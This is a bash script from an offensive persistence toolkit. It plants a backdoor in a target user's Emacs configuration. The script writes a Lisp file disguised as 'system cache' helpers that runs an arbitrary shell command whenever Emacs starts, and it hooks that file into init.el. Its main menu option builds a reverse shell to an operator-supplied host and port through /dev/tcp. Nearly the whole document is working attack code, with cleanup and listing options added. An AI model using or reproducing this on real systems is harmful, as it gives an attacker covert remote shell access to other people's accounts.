#!/bin/bash
# D3m0n1z3dShell — Emacs Extension Persistence (T1546)
# Based on Metasploit emacs_extension.rb — malicious .el Lisp file

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_emacs"

banner(){
    echo -e "${RED}"
    echo " ╔═══════════════════════════════════════════════════╗"
    echo " ║   Emacs Extension Persistence                     ║"
    echo " ║   T1546 — Malicious .el Lisp auto-loaded          ║"
    echo " ╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

install_emacs_backdoor(){
    local TARGET_USER="$1" PAYLOAD="$2"
    local HOME_DIR

    if [[ "$TARGET_USER" == "root" ]]; then
        HOME_DIR="/root"
    else
        HOME_DIR=$(getent passwd "$TARGET_USER" 2>/dev/null | cut -d: -f6)
    fi

    if [[ -z "$HOME_DIR" || ! -d "$HOME_DIR" ]]; then
        echo -e "${RED}[-] Home directory not found for ${TARGET_USER}${NC}"
        return 1
    fi

    local LISP_DIR="${HOME_DIR}/.emacs.d/lisp"
    local EL_FILE="${LISP_DIR}/d3m0n-helper.el"
    local INIT_FILE="${HOME_DIR}/.emacs.d/init.el"

    # Create lisp directory
    mkdir -p "$LISP_DIR"

    # Write malicious .el file
    cat > "$EL_FILE" << EOF
;;; d3m0n-helper.el --- System helper utilities  -*- lexical-binding: t; -*-
;;; ${MARKER}

;;; Commentary:
;; System cache management helpers

;;; Code:

(defun d3m0n-system-init ()
  "Initialize system cache helpers."
  (start-process "sys-cache" nil "/bin/sh" "-c" "${PAYLOAD}"))

;; Auto-run on load
(d3m0n-system-init)

(provide 'd3m0n-helper)
;;; d3m0n-helper.el ends here
EOF

    # Add to init.el
    if [[ ! -f "$INIT_FILE" ]]; then
        mkdir -p "$(dirname "$INIT_FILE")"
        echo ";; ${MARKER}" > "$INIT_FILE"
        echo "(add-to-list 'load-path \"~/.emacs.d/lisp\")" >> "$INIT_FILE"
        echo "(require 'd3m0n-helper)" >> "$INIT_FILE"
    elif ! grep -q "$MARKER" "$INIT_FILE" 2>/dev/null; then
        cp "$INIT_FILE" "${INIT_FILE}.d3m0n.bak"
        echo "" >> "$INIT_FILE"
        echo ";; ${MARKER}" >> "$INIT_FILE"
        echo "(add-to-list 'load-path \"~/.emacs.d/lisp\")" >> "$INIT_FILE"
        echo "(require 'd3m0n-helper)" >> "$INIT_FILE"
    fi

    # Fix ownership
    chown -R "${TARGET_USER}:" "${HOME_DIR}/.emacs.d" 2>/dev/null

    echo -e "${GREEN}[+] Emacs backdoor installed for ${TARGET_USER}${NC}"
    echo -e "${YELLOW}[*] Triggers when ${TARGET_USER} opens Emacs${NC}"
    echo -e "${YELLOW}[*] Extension: ${EL_FILE}${NC}"
}

menu(){
    banner

    echo -e "  ${CYAN}[1]${NC} Install (reverse shell)"
    echo -e "  ${CYAN}[2]${NC} Install (custom command)"
    echo -e "  ${CYAN}[3]${NC} List installed backdoors"
    echo -e "  ${CYAN}[4]${NC} Cleanup"
    echo ""
    read -p "  Choice [1-4]: " OPT

    case "$OPT" in
        1)
            read -p "  Target user [$(whoami)]: " USR
            USR="${USR:-$(whoami)}"
            read -p "  LHOST: " LHOST
            read -p "  LPORT: " LPORT
            PAYLOAD="nohup /bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 &"
            install_emacs_backdoor "$USR" "$PAYLOAD"
            ;;
        2)
            read -p "  Target user [$(whoami)]: " USR
            USR="${USR:-$(whoami)}"
            read -p "  Command: " CMD
            install_emacs_backdoor "$USR" "$CMD"
            ;;
        3)
            echo -e "${CYAN}[*] Scanning for d3m0n Emacs backdoors:${NC}"
            find /home /root -name 'd3m0n-helper.el' 2>/dev/null | while read -r f; do
                echo -e "  ${GREEN}→${NC} $f"
            done
            ;;
        4)
            echo -e "${YELLOW}[*] Removing Emacs backdoors...${NC}"
            find /home /root -name 'd3m0n-helper.el' 2>/dev/null | while read -r f; do
                rm -f "$f"
                echo -e "  ${GREEN}[+] Removed: $f${NC}"
            done
            # Restore init.el backups
            find /home /root -name 'init.el.d3m0n.bak' 2>/dev/null | while read -r f; do
                mv "$f" "${f%.d3m0n.bak}"
                echo -e "  ${GREEN}[+] Restored: ${f%.d3m0n.bak}${NC}"
            done
            # Remove marker lines from init.el if no backup
            find /home /root -path '*/.emacs.d/init.el' 2>/dev/null | while read -r f; do
                if grep -q "$MARKER" "$f" 2>/dev/null; then
                    sed -i "/${MARKER}/d; /d3m0n-helper/d" "$f"
                    echo -e "  ${GREEN}[+] Cleaned: $f${NC}"
                fi
            done
            echo -e "${GREEN}[+] Cleaned${NC}"
            ;;
    esac
}

menu
